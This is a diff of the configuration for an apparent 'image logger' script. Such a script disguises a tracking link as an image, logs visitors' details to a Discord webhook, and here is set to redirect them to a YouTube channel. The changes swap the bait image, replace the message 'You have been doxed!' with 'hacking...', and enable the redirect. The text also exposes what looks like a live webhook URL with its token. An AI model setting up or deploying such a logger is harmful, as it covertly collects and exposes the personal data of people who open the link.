@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1338912302904119388/2aMavD846slOrAKaK8zHixkIQoRmD3T4UsDnjv7OnG4eIaKEW08i9NPN9_zoOvpcOnUO",
-    "image": "https://yt3.googleusercontent.com/MkozLZHp31MsWBc5pKHcOclfIws-lWhqTDsVHvABoacX_tnXjc9gykN3vMxm3snmNlbsr61V6g=s160-c-k-c0x00ffffff-no-rj", # You can also have a custom image by using a URL argument
+    "image": "https://i.ibb.co/xtwdGZSJ/channels4-profile-2.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": True, # Enable the custom message?
-        "message": "You have been doxed!", # Message to show
+        "message": "hacking...", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -50,7 +50,7 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
+        "redirect": True, # Redirect to a webpage?
         "page": "https://www.youtube.com/@TechJoyce" # Link to the webpage to redirect to 
     },
 
